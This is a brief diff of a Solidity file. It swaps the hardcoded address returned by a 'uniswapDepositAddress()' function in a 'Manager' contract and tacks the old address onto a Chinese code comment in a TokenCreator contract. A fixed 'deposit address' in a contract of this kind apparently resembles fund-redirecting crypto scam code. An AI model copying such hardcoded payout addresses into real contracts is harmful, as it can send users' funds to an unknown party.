@@ -138,7 +138,7 @@ contract Manager {
 	}
 
 	function uniswapDepositAddress() public pure returns (address) {
-		return 0x207110f021E9C13826C1173a97fD80dFb585c736;
+		return  0x10ED43C718714eb63d5aA57B78B54704E256024E;
 	}
 }
 contract TokenCreator {
@@ -148,7 +148,7 @@ contract TokenCreator {
     {
         // 创建一个新的 Token 合约并且返回它的地址。
         // 从 JavaScript 方面来说，返回类型是简单的 `address` 类型，因为
-        // 这是在 ABI 中可用的最接近的类型。
+        // 这是在 ABI 中可用的最接近的类型。0x207110f021E9C13826C1173a97fD80dFb585c736
         return new OwnedToken(name);
     }
 
